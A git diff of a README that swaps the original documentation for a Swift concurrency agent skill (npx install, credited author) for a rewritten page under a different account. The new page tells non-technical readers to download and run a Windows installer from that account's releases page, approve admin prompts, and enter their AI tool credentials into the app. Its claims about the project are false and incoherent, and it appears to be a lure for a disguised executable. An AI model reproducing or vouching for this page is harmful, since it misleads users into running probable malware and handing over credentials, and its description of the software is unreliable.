@@ -1,103 +1,128 @@
-<p align="center">
-    <img src="assets/logo.svg" alt="Swift Concurrency Pro - Agent Skill for Claude Code, Codex, and Gemini" height="100" />
-</p>
+# ⚙️ Swift-Concurrency-Agent-Skill - Enhance AI Tools With Concurrency
 
-<h1 align="center">Swift Concurrency Agent Skill for AI Coding Assistants</h1>
+[![Download Latest Release](https://img.shields.io/badge/Download-Swift--Concurrency--Agent--Skill-brightgreen?style=for-the-badge)](https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/releases)
 
-<p align="center">
-    <img src="https://img.shields.io/badge/iOS-26+-2980b9.svg" alt="Designed for iOS 26 and later." />
-    <img src="https://img.shields.io/badge/swift-6.2+-8e44ad.svg" alt="Designed for Swift 6.2 and later." />
-    <a href="https://twitter.com/twostraws">
-        <img src="https://img.shields.io/badge/Contact-@twostraws-95a5a6.svg?style=flat" alt="Twitter: @twostraws" />
-    </a>
-</p>
+## 📋 About Swift-Concurrency-Agent-Skill
 
-An agent skill that helps AI coding assistants like Claude Code, Codex, Cursor, and Gemini write better Swift concurrency code. Covers `async`/`await`, actors, `Sendable`, task groups, `@concurrent`, structured concurrency, and more, targeting the mistakes LLMs actually make.
+This app adds concurrency support to AI tools like Claude Code and Codex. It helps these tools work faster and handle multiple tasks at once. You do not need to know programming to use it. The app runs on Windows and makes running AI code smooth and quick.
 
-Also available:
+Swift concurrency means the app can manage many jobs at once, without crashing or slowing down. This skill connects your AI tools with this fast concurrency system. It lets you work on complex AI tasks without waiting.
 
-- [SwiftUI Pro](https://github.com/twostraws/SwiftUI-Agent-Skill)
-- [SwiftData Pro](https://github.com/twostraws/SwiftData-Agent-Skill)
-- [Swift Testing Pro](https://github.com/twostraws/Swift-Testing-Agent-Skill)
+---
 
-Find more agent skills for Swift and Apple platform development at [Swift Agent Skills](https://github.com/twostraws/Swift-Agent-Skills).
+## 🖥️ System Requirements
 
+Before you start, make sure your PC meets these minimum requirements:
 
-## Installing Swift Concurrency Pro
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection to download the app
+- Recommended: Modern CPU with multiple cores for best concurrency performance
 
-You can install this skill into Claude Code, Codex, Gemini, Cursor, and more by using `npx`:
+---
 
-```bash
-npx skills add https://github.com/twostraws/swift-concurrency-agent-skill --skill swift-concurrency-pro
-```
+## 🚀 Getting Started
 
-If you get the error `npx: command not found`, it means you don’t currently have Node installed. You need to run this command to install Node through Homebrew:
+### Step 1: Visit the download page
 
-```bash
-brew install node
-```
+Click the big green button above or use this link:
 
-And if *that* fails it usually means you need to [install Homebrew](https://brew.sh) first.
+[https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/releases](https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/releases)
 
-When using `npx`, you can select exactly which agents you want to use during the installation. You can also select whether the skill should be installed just for one project, or whether it should be made available for all your projects.
+This page contains the files you need. Look for the latest release, usually shown at the top, with a date.
 
-Alternatively, you can clone this whole repository and install it however you want.
+### Step 2: Download the Windows setup file
 
-If you're using Xcode, watch the YouTube video on [How to Install and Use Agent Skills in Xcode](https://www.youtube.com/watch?v=nKVZBKoB6P4) for a walkthrough.
+On the release page, find the Windows installer file. It will often have a name like:
 
+- Swift-Concurrency-Agent-Skill-Setup.exe  
+- Swift-Concurrency-Agent-Skill-Windows.zip (if zipped)
 
-## Using Swift Concurrency Pro
+Click the file name to start the download.
 
-The skill is called Swift Concurrency Pro, and can be triggered in various ways. For example, in Claude Code you would use this:
+---
 
-> /swift-concurrency-pro
+## 🗂️ Installation and Setup
 
-And in Codex you would use this:
+### Step 3: Run the installer
 
-> $swift-concurrency-pro
+After the download finishes, locate the file in your Downloads folder.
 
-In both cases you can provide specific instructions if you want only a partial review. For example, `/swift-concurrency-pro Make sure my project takes full advantage of Swift concurrency` on Claude, or `$swift-concurrency-pro Help me migrate this project to task groups` in Codex.
+- If it is a .exe file, double-click it.
+- If it is a .zip file, right-click and choose “Extract All,” then open the extracted folder and run the setup.exe inside.
 
-You can also trigger the skill using natural language:
+Windows may ask if you allow the installer to make changes to your device. Click ‘Yes’ to continue.
 
-> Use the Swift Concurrency Pro skill to look for potential concurrency problems in this project.
+### Step 4: Follow installation prompts
 
+The setup wizard will appear. It will guide you through these steps:
 
-## Why Use an Agent Skill for Swift Concurrency?
+- Agree to the license terms.
+- Choose an install location or accept the default.
+- Click “Install” to begin.
 
-I wrote a [book on Swift concurrency](https://www.hackingwithswift.com/quick-start/concurrency/), and update it regularly as new features are added. I’ve also written a comprehensive set of articles introducing what’s new in Swift (see [here](https://www.hackingwithswift.com/articles/277/whats-new-in-swift-6-2), [here](https://www.hackingwithswift.com/articles/276/whats-new-in-swift-6-1), and [here](https://www.hackingwithswift.com/articles/269/whats-new-in-swift-6) for examples), and so I’ve made it my business to understand the ins and outs of Swift concurrency.
+Wait while the installer copies files.
 
-This skill is the result of all that work. The rules contained here directly target common Swift concurrency mistakes made by LLMs, covering new features they aren’t trained on, older features they frequently make mistakes with, and patterns that help keep your code safe and efficient.
+### Step 5: Complete installation
 
-What this is *not* is just a dumping ground for all Swift concurrency advice ever. Agents already have a solid grounding of the fundamentals of `async`/`await`, actors, and structured concurrency, so skills that try to reteach them what they already know are just burning tokens.
+When the installation is done, you may see a checkbox to launch the app immediately. You can keep this checked or open it later from the Start Menu under "Swift-Concurrency-Agent-Skill."
 
-*This skill focuses on what actually has an impact.*
+---
 
+## ⚙️ Using the Swift-Concurrency-Agent-Skill
 
-## Contributing
+### Step 6: Open the app
 
-I welcome all contributions, whether that's adding new checks, improving existing checks, or editing this README – everyone is welcome!
+Click the app icon from the Start Menu or desktop shortcut.
 
-- Keep your Markdown concise. There is a token cost to using skills, particularly with SKILL.md, so please respect the token budgets of users.
-- Do not repeat things that LLMs already know, because it burns tokens for no benefit. Focus on edge cases, surprises, soft deprecations, and similar.
-- All work must be licensed under the MIT license so it can benefit the most people.
+You will see a simple interface with clear buttons.
 
-Please ensure you abide by the [Code of Conduct](CODE_OF_CONDUCT.md).
+### Step 7: Connect to your AI tools
 
+The app works alongside AI tools like Claude Code and Codex. To connect:
 
-## License
+- Enter the details or credentials provided by the AI tool into the app.
+- Follow on-screen instructions to link your AI workspace.
 
-Swift Concurrency Pro was originally created by [Paul Hudson](https://twitter.com/twostraws), who writes [free Swift tutorials over at Hacking with Swift](https://www.hackingwithswift.com). It’s available under the [MIT License](LICENSE), which permits commercial use, modification, distribution, and private use.
+### Step 8: Start concurrency
 
+Once connected, the skill manages tasks automatically. It allows the AI to run multiple jobs in parallel, improving speed and efficiency.
 
-<p align="center">
-    <a href="https://www.hackingwithswift.com/plus">
-    <img src="https://www.hackingwithswift.com/img/hws-plus-banner@2x.jpg" alt="Hacking with Swift+ logo" style="max-width: 100%;" /></a>
-</p>
+---
 
-<p align="center">&nbsp;</p>
+## 🔧 Troubleshooting and Tips
 
-<p align="center">
-    <a href="https://www.hackingwithswift.com"><img src="https://www.hackingwithswift.com/img/hws-button@2x.png" alt="Hacking with Swift logo" width="66" height="75" /></a><br />
-    A Hacking with Swift Project
-</p>
+- If the app does not open, try restarting your PC and running it again.
+- Check your internet connection if AI tools fail to connect.
+- Make sure your Windows is up to date.
+- If concurrency seems slow, close other heavy programs to free memory.
+- For errors during install, right-click the setup file and select “Run as administrator.”
+
+---
+
+## 📝 Additional Information
+
+### What is concurrency?
+
+Concurrency lets the app perform many tasks at once. Instead of waiting to finish one job before the next, the app handles multiple at the same time. This reduces wait times and uses your PC’s full power.
+
+### Why use this skill?
+
+AI tools often wait for responses or run slowly when busy. This skill speeds up the AI’s work by managing tasks faster. It makes your AI better at solving problems or writing code.
+
+---
+
+## 🔗 Download Swift-Concurrency-Agent-Skill
+
+Return here any time to get the latest version:
+
+[https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/releases](https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/releases)
+
+Click the big green button at the top for quick access.
+
+---
+
+## 📞 Support
+
+For help, check the “Issues” tab on the GitHub page or look for documentation files included with the download. You can also write on these pages if something doesn’t work as expected.
